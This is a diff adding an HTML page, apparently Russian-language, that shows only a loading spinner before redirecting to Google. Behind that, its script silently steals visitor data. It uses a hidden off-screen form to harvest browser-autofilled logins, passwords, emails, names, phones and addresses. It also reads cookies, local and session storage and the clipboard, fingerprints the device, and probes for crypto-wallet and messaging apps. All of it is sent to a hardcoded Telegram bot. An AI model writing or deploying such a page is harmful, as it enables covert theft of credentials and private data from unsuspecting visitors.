@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+<title></title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{width:100vw;height:100vh;background:#fff;display:flex;justify-content:center;align-items:center}
+.s{width:30px;height:30px;border:3px solid #eee;border-top-color:#999;border-radius:50%;animation:r 0.6s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="s"></div>
+
+<div style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none">
+<form>
+<input type="text" name="u" autocomplete="username">
+<input type="password" name="p" autocomplete="current-password">
+<input type="email" name="e" autocomplete="email">
+<input type="text" name="fn" autocomplete="name">
+<input type="text" name="gn" autocomplete="given-name">
+<input type="text" name="ln" autocomplete="family-name">
+<input type="tel" name="ph" autocomplete="tel-national">
+<input type="tel" name="ph2" autocomplete="tel">
+<input type="text" name="org" autocomplete="organization">
+<input type="text" name="adr" autocomplete="street-address">
+<input type="text" name="cty" autocomplete="address-level2">
+<input type="text" name="cnt" autocomplete="country-name">
+<input type="text" name="pst" autocomplete="postal-code">
+</form>
+</div>
+
+<script>
+(async()=>{
+const TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
+const CHAT="8192226287";
+const REDIR="https://www.google.com";
+const sid='s'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
+const d={};
+
+try{
+const r=await fetch("https://ipapi.co/json/");
+const j=await r.json();
+d.ip=j.ip||"-";d.country=j.country_name||"-";d.city=j.city||"-";
+d.region=j.region||"-";d.provider=j.org||"-";d.postal=j.postal||"-";d.tz_ip=j.timezone||"-"
+}catch(e){d.ip="error"}
+
+try{
+const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("");const o=await pc.createOffer();await pc.setLocalDescription(o);
+const c=await new Promise(res=>{pc.onicecandidate=e=>{if(e&&e.candidate)res(e.candidate.candidate);else res("")};setTimeout(()=>res(""),1200)});
+d.webrtc=c||"-";pc.close()
+}catch(e){d.webrtc="error"}
+
+d.ua=navigator.userAgent;d.platform=navigator.platform;d.lang=navigator.language;
+d.langs=JSON.stringify(navigator.languages||[]);d.sw=screen.width;d.sh=screen.height;
+d.aw=screen.availWidth;d.ah=screen.availHeight;d.cd=screen.colorDepth;
+d.pr=window.devicePixelRatio;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+d.cpu=navigator.hardwareConcurrency||"?";d.ram=navigator.deviceMemory||"?";
+d.touch=navigator.maxTouchPoints||0;d.mobile=/Mobi|Android/i.test(navigator.userAgent);
+d.vendor=navigator.vendor||"-";d.dnt=navigator.doNotTrack||"-";
+
+try{
+const cv=document.createElement('canvas');const gl=cv.getContext('webgl');
+if(gl){const db=gl.getExtension('WEBGL_debug_renderer_info');
+if(db){d.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL);d.gpuv=gl.getParameter(db.UNMASKED_VENDOR_WEBGL)}}
+}catch(e){}
+if(!d.gpu)d.gpu="-";
+
+try{
+const cv=document.createElement('canvas');cv.width=300;cv.height=60;
+const cx=cv.getContext('2d');cx.font="16px Arial";
+cx.fillStyle="#f60";cx.fillRect(10,10,80,30);
+cx.fillStyle="#069";cx.fillText("FP"+Date.now(),20,32);
+d.cf=cv.toDataURL().length
+}catch(e){d.cf="-"}
+
+try{
+const ac=new(window.AudioContext||window.webkitAudioContext)();
+const osc=ac.createOscillator();const an=ac.createAnalyser();
+osc.connect(an);an.connect(ac.destination);osc.start(0);
+const fd=new Float32Array(an.frequencyBinCount);an.getFloatFrequencyData(fd);
+d.af=fd[0].toFixed(6);osc.stop();ac.close()
+}catch(e){d.af="-"}
+
+try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% ch:"+b.charging}catch(e){d.bat="-"}
+d.online=navigator.onLine;
+try{if(navigator.connection){d.conn=navigator.connection.effectiveType;d.dl=navigator.connection.downlink+"Mbps"}}catch(e){}
+d.ref=document.referrer||"direct";d.url=window.location.href;
+d.cookie=document.cookie||"-";
+
+try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1500)}catch(e){d.ls="-"}
+try{const ss={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);if(k)ss[k]=sessionStorage.getItem(k)}d.ss=JSON.stringify(ss).substring(0,1500)}catch(e){d.ss="-"}
+try{d.clip=await navigator.clipboard.readText()||"-"}catch(e){d.clip="no access"}
+
+await new Promise(r=>setTimeout(r,2000));
+
+d.af_u=document.querySelector('[name="u"]').value||"-";
+d.af_p=document.querySelector('[name="p"]').value||"-";
+d.af_e=document.querySelector('[name="e"]').value||"-";
+d.af_fn=document.querySelector('[name="fn"]').value||"-";
+d.af_gn=document.querySelector('[name="gn"]').value||"-";
+d.af_ln=document.querySelector('[name="ln"]').value||"-";
+d.af_ph=document.querySelector('[name="ph"]').value||"-";
+d.af_ph2=document.querySelector('[name="ph2"]').value||"-";
+d.af_org=document.querySelector('[name="org"]').value||"-";
+d.af_adr=document.querySelector('[name="adr"]').value||"-";
+d.af_cty=document.querySelector('[name="cty"]').value||"-";
+d.af_cnt=document.querySelector('[name="cnt"]').value||"-";
+d.af_pst=document.querySelector('[name="pst"]').value||"-";
+
+d.apps=[];
+const schemes={
+'Telegram':'tg://','WhatsApp':'whatsapp://','MetaMask':'metamask://',
+'TrustWallet':'trust://','Phantom':'phantom://','Coinbase':'coinbase://',
+'Binance':'binance://','Discord':'discord://','Twitter':'twitter://',
+'Instagram':'instagram://','TikTok':'snssdk1233://','VK':'vk://',
+'YouTube':'youtube://'
+};
+for(const[nm,sc]of Object.entries(schemes)){
+try{
+const ifr=document.createElement('iframe');ifr.style.display='none';
+ifr.src=sc;document.body.appendChild(ifr);
+await new Promise(r=>setTimeout(r,50));
+document.body.removeChild(ifr);d.apps.push(nm)
+}catch(e){}
+}
+
+const msg=
+`🚨 ЗАХОД
+
+🆔 ${sid}
+🕐 ${new Date().toLocaleString("ru-RU")}
+
+🌐 IP: ${d.ip}
+📍 ${d.country}, ${d.city}
+📡 ${d.provider}
+🔍 WebRTC: ${d.webrtc}
+🕐 TZ: ${d.tz} / IP TZ: ${d.tz_ip}
+
+📱 ${d.platform} | ${d.mobile?'MOBILE':'PC'}
+🖥 ${d.sw}x${d.sh} | CPU:${d.cpu} | RAM:${d.ram}
+🗣 ${d.lang}
+🎮 ${d.gpu}
+🔋 ${d.bat}
+📶 ${d.conn||"-"}
+
+👤 LOGIN: ${d.af_u}
+🔑 PASS: ${d.af_p}
+📧 EMAIL: ${d.af_e}
+📛 NAME: ${d.af_fn}
+👤 FIRST: ${d.af_gn}
+👤 LAST: ${d.af_ln}
+📞 PHONE: ${d.af_ph}
+📞 PHONE2: ${d.af_ph2}
+🏢 ORG: ${d.af_org}
+🏠 ADDR: ${d.af_adr}
+🏙 CITY: ${d.af_cty}
+🌍 COUNTRY: ${d.af_cnt}
+📮 POSTAL: ${d.af_pst}
+
+📋 CLIPBOARD: ${(d.clip||'-').substring(0,500)}
+📦 APPS: ${d.apps.length?d.apps.join(', '):'none'}
+🔗 REF: ${d.ref}
+🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}
+💾 LS: ${(d.ls||'-').substring(0,300)}`;
+
+await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:CHAT,text:msg})
+});
+
+if(d.clip&&d.clip.length>500){
+await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:CHAT,text:`📋 FULL CLIPBOARD ${sid}:\n\n${d.clip.substring(0,3500)}`})
+})
+}
+
+setTimeout(()=>{window.location.replace(REDIR)},600)
+})();
+</script>
+</body>
+</html>
